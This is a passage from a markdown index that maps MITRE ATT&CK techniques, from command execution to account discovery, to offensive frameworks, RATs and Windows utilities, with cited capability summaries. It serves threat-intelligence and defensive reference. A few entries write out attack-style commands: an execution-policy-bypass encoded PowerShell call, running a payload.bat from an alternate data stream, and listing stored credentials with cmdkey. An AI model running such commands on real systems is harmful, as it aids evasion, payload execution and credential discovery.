- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) listed all running processes on the machine.(Citation: FOX-IT May 2016 Mofang)
- [Tasklist](../tools/unknown/tasklist.md) — explicit, source. [Tasklist](https://attack.mitre.org/software/S0057) can be used to discover processes running on a system.(Citation: Microsoft Tasklist)

## T1059 - Command and Scripting Interpreter

- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) can generate shellcode outputs that execute via Ruby.(Citation: Donut Github)	
- [Dotnet.exe](../tools/windows/dotnet.exe.md) — explicit, source. Command metadata lists T1059: dotnet.exe fsi
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) uses a command-line interface to interact with systems.(Citation: Github PowerShell Empire)
- [Fsi.exe](../tools/windows/fsi.exe.md) — explicit, source. Command metadata lists T1059: fsi.exe
- [FsiAnyCpu.exe](../tools/windows/fsianycpu.exe.md) — explicit, source. Command metadata lists T1059: fsianycpu.exe
- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has a CommandPromptPacket and ScriptPacket module(s) for creating a remote shell and executing scripts.(Citation: QiAnXin APT-C-36 Feb2019)

## T1059.001 - PowerShell

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) is written and executed via PowerShell.(Citation: AADInternals Documentation)
- [BloodHound](../tools/unknown/bloodhound.md) — explicit, source. [BloodHound](https://attack.mitre.org/software/S0521) can use PowerShell to pull Active Directory information from the target environment.(Citation: CrowdStrike BloodHound April 2018)
- [ConnectWise](../tools/unknown/connectwise.md) — explicit, source. [ConnectWise](https://attack.mitre.org/software/S0591) can be used to execute PowerShell commands on target machines.(Citation: Anomali Static Kitten February 2021)
- [Covenant](../tools/unknown/covenant.md) — explicit, source. [Covenant](https://attack.mitre.org/software/S1155) can create PowerShell-based launchers for Grunt installation.(Citation: Github Covenant)
- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can execute PowerShell commands via WMI.(Citation: CME Github September 2018)
- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) can generate shellcode outputs that execute via PowerShell.(Citation: Donut Github)	
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) leverages PowerShell for the majority of its client-side agent tasks. [Empire](https://attack.mitre.org/software/S0363) also contains the ability to conduct PowerShell remoting with the <code>Invoke-PSRemoting</code> module.(Citation: Github PowerShell Empire)(Citation: NCSC Joint Report Public Tools)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) has used PowerShell to establish persistence.(Citation: MalwareBytes LazyScripter Feb 2021) 
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) modules are written in and executed via [PowerShell](https://attack.mitre.org/techniques/T1086).(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [Powershell.exe](../tools/windows/powershell.exe.md) — explicit, source. Command metadata lists T1059.001: powershell.exe -ep bypass -ec IgBXAGUAIAA8ADMAIABMAE8ATABCAEEAUwAiAA==
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) has a module for loading and executing PowerShell scripts.(Citation: GitHub Pupy)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can use PowerShell to execute commands.(Citation: GitHub SILENTTRINITY Modules July 2019)
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) has built-in functionality to launch a Powershell command prompt.(Citation: Cybereason Sliver Undated)

## T1059.003 - Windows Command Shell

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) can be deployed via batch script.(Citation: ESET MirrorFace 2025)
- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can use cmd.exe for execution.(Citation: Palo Alto Brute Ratel July 2022)
- [Cmd.exe](../tools/windows/cmd.exe.md) — explicit, source. Command metadata lists T1059.003: cmd.exe - < {PATH}:payload.bat
- [Covenant](../tools/unknown/covenant.md) — explicit, source. [Covenant](https://attack.mitre.org/software/S1155) provides access to a Command Shell in Windows environments for follow-on command execution and tasking.(Citation: Github Covenant)
- [Diskpart](../tools/unknown/diskpart.md) — explicit, source. [Diskpart](https://attack.mitre.org/software/S9002) can execute a disk partition script file, which attempts to mount a virtual hard disk.(Citation: Halcyon_CloakRansomware_Dec2024) [Diskpart](https://attack.mitre.org/software/S9002) can also assign and mount virtual disks.(Citation: Halcyon_CloakRansomware_Dec2024)   
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) has modules for executing scripts.(Citation: Github PowerShell Empire)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can open an interactive command-shell to perform command line functions on victim machines. [Koadic](https://attack.mitre.org/software/S0250) performs most of its operations using Windows Script Host (Jscript) and to run arbitrary shellcode.(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021)
- [MCMD](../tools/unknown/mcmd.md) — explicit, source. [MCMD](https://attack.mitre.org/software/S0500) can launch a console process (cmd.exe) with redirected standard input and output.(Citation: Secureworks MCMD July 2019)
- [Out1](../tools/unknown/out1.md) — explicit, source. [Out1](https://attack.mitre.org/software/S0594) can use native command line for execution.(Citation: Trend Micro Muddy Water March 2021)
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) can execute `cmd` commands on a compromised host.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) can launch a remote shell to execute commands on the victim’s machine.(Citation: GitHub QuasarRAT)(Citation: CISA AR18-352A Quasar RAT December 2018)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can launch a remote command line to execute commands on the victim’s machine.(Citation: Fortinet Remcos Feb 2017)(Citation: Fortinet Remcos Campaign NOV 2024)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can use `cmd.exe` to enable lateral movement using DCOM.(Citation: GitHub SILENTTRINITY Modules July 2019)
- [cmd](../tools/unknown/cmd.md) — explicit, source. [cmd](https://attack.mitre.org/software/S0106) is used to execute programs and other actions at the command-line interface.(Citation: TechNet Cmd)

## T1059.005 - Visual Basic

- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) can generate shellcode outputs that execute via VBScript.(Citation: Donut Github)	
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) performs most of its operations using Windows Script Host (VBScript) and runs arbitrary shellcode .(Citation: Github Koadic)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can execute VBS remotely.(Citation: Fortinet Remcos Campaign NOV 2024)

## T1059.006 - Python

- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) can generate shellcode outputs that execute via Python.(Citation: Donut Github)	
- [IronNetInjector](../tools/unknown/ironnetinjector.md) — explicit, source. [IronNetInjector](https://attack.mitre.org/software/S0581) can use IronPython scripts to load payloads with the help of a .NET injector.(Citation: Unit 42 IronNetInjector February 2021 )
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can use an add on feature when creating payloads that allows you to create custom Python scripts (“scriptlets”) to perform tasks offline (without requiring a session) such as sandbox detection, adding persistence, etc.(Citation: GitHub Pupy)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) uses Python scripts.(Citation: Riskiq Remcos Jan 2018)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) is written in Python and can use multiple Python scripts for execution on targeted systems.(Citation: GitHub SILENTTRINITY March 2022)(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1059.007 - JavaScript

- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) can generate shellcode outputs that execute via JavaScript or JScript.(Citation: Donut Github)	
- [FRP](../tools/unknown/frp.md) — explicit, source. [FRP](https://attack.mitre.org/software/S1144) can support the use of a JSON configuration file.(Citation: FRP GitHub)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) has the ability to execute JavaScript remotely.(Citation: Fortinet Remcos Campaign NOV 2024)
- [evilginx2](../tools/unknown/evilginx2.md) — explicit, source. [evilginx2](https://attack.mitre.org/software/S9003) can inject JavaScript code into HTML content to customize phishing attacks.(Citation: Breakdev Evilginx 2.3 JAN 2019)

## T1059.009 - Cloud API

- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) leverages the AWS CLI for its operations.(Citation: GitHub Pacu)
- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) has leveraged Cloud CLI in order to enumerate and gather credentials.(Citation: Github TruffleSecurity Trufflehog April 2025)

## T1068 - Exploitation for Privilege Escalation

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can exploit vulnerabilities such as MS16-032 and MS16-135.(Citation: Github PowerShell Empire)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) contains modules for local privilege escalation exploits such as CVE-2016-9192 and CVE-2016-0099.(Citation: GitHub PoshC2)

## T1069 - Permission Groups Discovery

- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) gathered the local privileges for the infected host.(Citation: FOX-IT May 2016 Mofang)

## T1069.001 - Local Groups

- [BloodHound](../tools/unknown/bloodhound.md) — explicit, source. [BloodHound](https://attack.mitre.org/software/S0521) can collect information about local groups and members.(Citation: CrowdStrike BloodHound April 2018)
- [Net](../tools/unknown/net.md) — explicit, source. Commands such as <code>net group</code> and <code>net localgroup</code> can be used in [Net](https://attack.mitre.org/software/S0039) to gather information about and manipulate groups.(Citation: Savill 1999)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) contains modules, such as <code>Get-LocAdm</code> for enumerating permission groups.(Citation: GitHub PoshC2)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can obtain a list of local groups and members.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1069.002 - Domain Groups

- [AdFind](../tools/unknown/adfind.md) — explicit, source. [AdFind](https://attack.mitre.org/software/S0552) can enumerate domain groups.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)(Citation: FireEye Ryuk and Trickbot January 2019)(Citation: Symantec Bumblebee June 2022)
- [BloodHound](../tools/unknown/bloodhound.md) — explicit, source. [BloodHound](https://attack.mitre.org/software/S0521) can collect information about domain groups and members.(Citation: CrowdStrike BloodHound April 2018)
- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can use `net group` for discovery on targeted domains.(Citation: Trend Micro Black Basta October 2022)
- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can gather the user accounts within domain groups.(Citation: CME Github September 2018)
- [Net](../tools/unknown/net.md) — explicit, source. Commands such as <code>net group /domain</code> can be used in [Net](https://attack.mitre.org/software/S0039) to gather information about and manipulate groups.(Citation: Savill 1999)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can use `System.DirectoryServices` namespace to retrieve domain group information.(Citation: GitHub SILENTTRINITY Modules July 2019)
- [dsquery](../tools/unknown/dsquery.md) — explicit, source. [dsquery](https://attack.mitre.org/software/S0105) can be used to gather information on permission groups within a domain.(Citation: TechNet Dsquery)(Citation: Mandiant APT41)

## T1069.003 - Cloud Groups

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can enumerate Azure AD groups.(Citation: AADInternals Documentation)
- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can enumerate IAM permissions.(Citation: GitHub Pacu)
- [ROADTools](../tools/unknown/roadtools.md) — explicit, source. [ROADTools](https://attack.mitre.org/software/S0684) can enumerate Azure AD groups.(Citation: Roadtools)	

## T1070 - Indicator Removal

- [CSPY Downloader](../tools/unknown/cspy-downloader.md) — explicit, source. [CSPY Downloader](https://attack.mitre.org/software/S0527) has the ability to remove values it writes to the Registry.(Citation: Cybereason Kimsuky November 2020)
- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) can erase file references to payloads in-memory after being reflectively loaded and executed.(Citation: Donut Github)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can clean saved cookies and logins from the web browser.(Citation: Fortinet Remcos Campaign NOV 2024)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can remove artifacts from the compromised host, including created Registry keys.(Citation: GitHub SILENTTRINITY Modules July 2019)
- [Update.exe](../tools/windows/update.exe.md) — explicit, source. Command metadata lists T1070: Update.exe --removeShortcut={PATH:.exe}-l=Startup

## T1070.004 - File Deletion

- [CSPY Downloader](../tools/unknown/cspy-downloader.md) — explicit, source. [CSPY Downloader](https://attack.mitre.org/software/S0527) has the ability to self delete.(Citation: Cybereason Kimsuky November 2020)
- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has deleted files related to its dynamic debugger feature.(Citation: QiAnXin APT-C-36 Feb2019)
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) has deleted its files and components from a compromised host.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can delete files and folders from victim machines.(Citation: Fortinet Remcos Campaign NOV 2024)
- [SDelete](../tools/unknown/sdelete.md) — explicit, source. [SDelete](https://attack.mitre.org/software/S0195) deletes data in a way that makes it unrecoverable.(Citation: Microsoft SDelete July 2016)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can remove files from the compromised host.(Citation: GitHub SILENTTRINITY Modules July 2019)
- [cmd](../tools/unknown/cmd.md) — explicit, source. [cmd](https://attack.mitre.org/software/S0106) can be used to delete files from the file system.(Citation: TechNet Del)

## T1070.005 - Network Share Connection Removal

- [Net](../tools/unknown/net.md) — explicit, source. The <code>net use \\system\share /delete</code> command can be used in [Net](https://attack.mitre.org/software/S0039) to remove an established connection to a network share.(Citation: Technet Net Use)

## T1070.006 - Timestomp

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can timestomp any files or payloads placed on a target machine to help them blend in.(Citation: Github PowerShell Empire)

## T1070.009 - Clear Persistence

- [MCMD](../tools/unknown/mcmd.md) — explicit, source. [MCMD](https://attack.mitre.org/software/S0500) has the ability to remove set Registry Keys, including those used for persistence.(Citation: Secureworks MCMD July 2019)

## T1071 - Application Layer Protocol

- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) can utilize the Wireguard VPN protocol for command and control.(Citation: Cybereason Sliver Undated)

## T1071.001 - Web Protocols

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can use HTTPS and HTTPS for C2 communication.(Citation: Palo Alto Brute Ratel July 2022)(Citation: Trend Micro Black Basta October 2022)
- [CSPY Downloader](../tools/unknown/cspy-downloader.md) — explicit, source. [CSPY Downloader](https://attack.mitre.org/software/S0527) can use GET requests to download additional payloads from C2.(Citation: Cybereason Kimsuky November 2020)
- [Covenant](../tools/unknown/covenant.md) — explicit, source. [Covenant](https://attack.mitre.org/software/S1155) can establish command and control via HTTP.(Citation: Github Covenant)
- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) can use HTTP to download previously staged shellcode payloads.(Citation: Donut Github)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can conduct command and control over protocols like HTTP and HTTPS.(Citation: Github PowerShell Empire)
- [FRP](../tools/unknown/frp.md) — explicit, source. [FRP](https://attack.mitre.org/software/S1144) has the ability to use HTTP and HTTPS to enable the forwarding of requests for internal services via domain name.(Citation: FRP GitHub)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) has used HTTP for C2 communications.(Citation: MalwareBytes LazyScripter Feb 2021)
- [MCMD](../tools/unknown/mcmd.md) — explicit, source. [MCMD](https://attack.mitre.org/software/S0500) can use HTTPS in communication with C2 web servers.(Citation: Secureworks MCMD July 2019)
- [Mythic](../tools/unknown/mythic.md) — explicit, source. [Mythic](https://attack.mitre.org/software/S0699) supports HTTP-based C2 profiles.(Citation: Mythc Documentation)	
- [Out1](../tools/unknown/out1.md) — explicit, source. [Out1](https://attack.mitre.org/software/S0594) can use HTTP and HTTPS in communications with remote hosts.(Citation: Trend Micro Muddy Water March 2021)
- [PcShare](../tools/unknown/pcshare.md) — explicit, source. [PcShare](https://attack.mitre.org/software/S1050) has used HTTP for C2 communication.(Citation: Bitdefender FunnyDream Campaign November 2020)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) can use protocols like HTTP/HTTPS for command and control traffic.(Citation: GitHub PoshC2)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can communicate over HTTP for C2.(Citation: GitHub Pupy)
- [Quick Assist](../tools/unknown/quick-assist.md) — explicit, source. [Quick Assist](https://attack.mitre.org/software/S1209) communicates over TCP 443 via HTTPS to a remote session server, under which RDP traffic is transferred.(Citation: Microsoft Quick Assist 2024)
- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) communicated over HTTP with preconfigured C2 servers.(Citation: FOX-IT May 2016 Mofang)
- [Sliver](../tools/unknown/sliver.md) — explicit, source.  [Sliver](https://attack.mitre.org/software/S0633) has the ability to support C2 communications over HTTP and HTTPS.(Citation: Cybersecurity Advisory SVR TTP May 2021)(Citation: Bishop Fox Sliver Framework August 2019)(Citation: GitHub Sliver C2)(Citation: Cybereason Sliver Undated)(Citation: Microsoft Sliver 2022)
- [evilginx2](../tools/unknown/evilginx2.md) — explicit, source. [evilginx2](https://attack.mitre.org/software/S9003) can proxy HTTPS connections between victims and destination websites.(Citation: Evilginx 2 July 2018)(Citation: Breakdev Evilginx 2.4 SEP 2020)(Citation: Breakdev Evilginx 3.3 APR 2024)

## T1071.002 - File Transfer Protocols

- [CARROTBALL](../tools/unknown/carrotball.md) — explicit, source. [CARROTBALL](https://attack.mitre.org/software/S0465) has the ability to use FTP in C2 communications.(Citation: Unit 42 CARROTBAT January 2020)
- [Mythic](../tools/unknown/mythic.md) — explicit, source. [Mythic](https://attack.mitre.org/software/S0699) supports SMB-based peer-to-peer C2 profiles.(Citation: Mythc Documentation)	

## T1071.004 - DNS

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can use DNS over HTTPS for C2.(Citation: Palo Alto Brute Ratel July 2022)(Citation: Trend Micro Black Basta October 2022)
- [Mythic](../tools/unknown/mythic.md) — explicit, source. [Mythic](https://attack.mitre.org/software/S0699) supports DNS-based C2 profiles.(Citation: Mythc Documentation)	
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) can support C2 communications over DNS.(Citation: Cybersecurity Advisory SVR TTP May 2021)(Citation: Bishop Fox Sliver Framework August 2019)(Citation: GitHub Sliver C2 DNS)(Citation: Cybereason Sliver Undated)(Citation: Microsoft Sliver 2022)

## T1078 - Valid Accounts

- [Cmdkey.exe](../tools/windows/cmdkey.exe.md) — explicit, source. Command metadata lists T1078: cmdkey /list

## T1078.004 - Cloud Accounts

- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) leverages valid cloud accounts to perform most of its operations.(Citation: GitHub Pacu)
- [Peirates](../tools/unknown/peirates.md) — explicit, source. [Peirates](https://attack.mitre.org/software/S0683) can use stolen service account tokens to perform its operations.(Citation: Peirates GitHub)
- [ROADTools](../tools/unknown/roadtools.md) — explicit, source. [ROADTools](https://attack.mitre.org/software/S0684) leverages valid cloud credentials to perform enumeration operations using the internal Azure AD Graph API.(Citation: Roadtools)	
- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) has used stolen credentials to log into cloud services to access cloud hosted repositories and other cloud storage solutions to discover sensitive data to include API Keys, tokens and credentials.(Citation: Github TruffleSecurity Trufflehog April 2025)

## T1082 - System Information Discovery

- [Covenant](../tools/unknown/covenant.md) — explicit, source. [Covenant](https://attack.mitre.org/software/S1155) implants can gather basic information on infected systems.(Citation: Github Covenant)
- [Diskpart](../tools/unknown/diskpart.md) — explicit, source. [Diskpart](https://attack.mitre.org/software/S9002) can show information about the selected disk, partition, volume, or virtual hard disk (VHD).(Citation: Microsoft_diskpart_Feb2023) 
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can enumerate host system information like OS, architecture, domain name, applied patches, and more.(Citation: Github PowerShell Empire)(Citation: Talos Frankenstein June 2019)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can obtain the OS version and build, computer name, and processor architecture from a compromised host.(Citation: MalwareBytes LazyScripter Feb 2021)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) contains modules, such as <code>Get-ComputerInfo</code>, for enumerating common system information.(Citation: GitHub PoshC2)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can grab a system’s information including the OS version, architecture, etc.(Citation: GitHub Pupy)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) can gather system information from the victim’s machine including the OS type.(Citation: GitHub QuasarRAT)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can collect the OS version and process architecture of compromised hosts.(Citation: Fortinet Remcos Campaign NOV 2024)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can collect information related to a compromised host, including OS version.(Citation: GitHub SILENTTRINITY Modules July 2019)
- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) gathered the operating system name and specific Windows version of an infected machine.(Citation: FOX-IT May 2016 Mofang)
- [Systeminfo](../tools/unknown/systeminfo.md) — explicit, source. [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather information about the operating system.(Citation: TechNet Systeminfo)
- [cmd](../tools/unknown/cmd.md) — explicit, source. [cmd](https://attack.mitre.org/software/S0106) can be used to find information about the operating system.(Citation: TechNet Dir)
- [dsquery](../tools/unknown/dsquery.md) — explicit, source. [dsquery](https://attack.mitre.org/software/S0105) has the ability to enumerate various information, such as the operating system and host name, for systems within a domain.(Citation: Mandiant APT41)

## T1083 - File and Directory Discovery

- [CrackMapExec](../tools/unknown/crackmapexec.md) — explicit, source. [CrackMapExec](https://attack.mitre.org/software/S0488) can discover specified filetypes and log files on a targeted system.(Citation: CME Github September 2018)
- [Diskpart](../tools/unknown/diskpart.md) — explicit, source. If executed with elevated privileges, [Diskpart](https://attack.mitre.org/software/S9002) can list all volumes, including virtual disks.(Citation: Halcyon_CloakRansomware_Dec2024)   
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) includes various modules for finding files of interest on hosts and network shares.(Citation: Github PowerShell Empire)
- [Forfiles](../tools/unknown/forfiles.md) — explicit, source. [Forfiles](https://attack.mitre.org/software/S0193) can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension, name, and/or age)(Citation: Überwachung APT28 Forfiles June 2015)
- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has a dynamic debugging feature to check whether it is located in the %TEMP% directory, otherwise it copies itself there.(Citation: QiAnXin APT-C-36 Feb2019)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can obtain a list of directories.(Citation: MalwareBytes LazyScripter Feb 2021)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) can enumerate files on the local file system and includes a module for enumerating recently accessed files.(Citation: GitHub PoshC2)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can walk through directories and recursively search for strings in files.(Citation: GitHub Pupy)
- [Rclone](../tools/unknown/rclone.md) — explicit, source. [Rclone](https://attack.mitre.org/software/S1040) can list files and directories with the `ls`, `lsd`, and `lsl` commands.(Citation: Rclone)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can search for files on the infected machine.(Citation: Riskiq Remcos Jan 2018)(Citation: Fortinet Remcos Campaign NOV 2024)
- [RemoteUtilities](../tools/unknown/remoteutilities.md) — explicit, source. [RemoteUtilities](https://attack.mitre.org/software/S0592) can enumerate files and directories on a target machine.(Citation: Trend Micro Muddy Water March 2021)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) has several modules, such as `ls.py`, `pwd.py`, and `recentFiles.py`, to enumerate directories and files.(Citation: GitHub SILENTTRINITY Modules July 2019) 
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) can enumerate files on a target system.(Citation: GitHub Sliver File System August 2021)
- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) has can browse and scan individual files and directories.(Citation: Black Hills Information Security TruffleHog January 2024)(Citation: Netskope Shai-Hulud November 2025)(Citation: Github TruffleSecurity Trufflehog April 2025)
- [cmd](../tools/unknown/cmd.md) — explicit, source. [cmd](https://attack.mitre.org/software/S0106) can be used to find files and directories with native functionality such as <code>dir</code> commands.(Citation: TechNet Dir)

## T1087 - Account Discovery

- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) listed all non-privileged and privileged accounts available on the machine.(Citation: FOX-IT May 2016 Mofang)

## T1087.001 - Local Account

- [BloodHound](../tools/unknown/bloodhound.md) — explicit, source. [BloodHound](https://attack.mitre.org/software/S0521) can identify users with local administrator rights.(Citation: CrowdStrike BloodHound April 2018)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can acquire local and domain user account information.(Citation: Github PowerShell Empire)
- [Net](../tools/unknown/net.md) — explicit, source. Commands under <code>net user</code> can be used in [Net](https://attack.mitre.org/software/S0039) to gather information about and manipulate user accounts.(Citation: Savill 1999)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) can enumerate local and domain user account information.(Citation: GitHub PoshC2)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Get-ProcessTokenGroup</code> Privesc-PowerUp module can enumerate all SIDs associated with its current token.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) uses PowerView and Pywerview to perform discovery commands such as net user, net group, net local group, etc.(Citation: GitHub Pupy)

## T1087.002 - Domain Account

- [AdFind](../tools/unknown/adfind.md) — explicit, source. [AdFind](https://attack.mitre.org/software/S0552) can enumerate domain users.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)(Citation: FireEye Ryuk and Trickbot January 2019)(Citation: Cybereason Bumblebee August 2022)(Citation: Symantec Bumblebee June 2022)
- [BloodHound](../tools/unknown/bloodhound.md) — explicit, source. [BloodHound](https://attack.mitre.org/software/S0521) can collect information about domain users, including identification of domain admin accounts.(Citation: CrowdStrike BloodHound April 2018)
